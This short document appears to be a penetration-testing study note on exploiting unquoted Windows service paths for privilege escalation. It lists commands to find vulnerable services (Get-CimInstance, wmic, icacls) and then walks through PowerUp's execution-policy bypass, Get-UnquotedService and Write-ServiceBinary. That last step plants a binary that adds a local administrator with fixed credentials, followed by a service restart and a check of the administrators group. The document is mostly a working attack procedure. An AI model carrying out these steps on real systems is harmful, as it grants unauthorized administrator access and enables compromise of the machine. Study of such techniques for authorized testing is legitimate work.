We can use this attack when we have Write permissions to a service's main directory or subdirectories but cannot replace files within them.

Get list of running and stopped services:
On PS:
```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
```

A more effective way is to use the wmic command from cmd.exe:
```
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```

Check access to potential locations with icacls:
```
icacls "C:\[PATH]"
```


Look for write "W" or "F" permissions

| Mask | Permissions             |
| ---- | ----------------------- |
| F    | Full access             |
| M    | Modify access           |
| RX   | Read and execute access |
| R    | Read-only access        |
| W    | Write-only access       |
- Add the executable to location that makes sense
- Stop and restart service


Powerup can be used to identify this vulnerability:
```
powershell -ep bypass
```
```
. .\PowerUp.ps1
```
```
Get-UnquotedService
```
The abuse function can be used as follows, default credentials added are john;Password123!:
```
Write-ServiceBinary -Name 'ReynhSurveillance' -Path "C:\Enterprise Software\Monitoring Solution"
```
```
Restart-Service [SERVICENAME]
```
Check to see if it worked:
```
net localgroup administrators
```
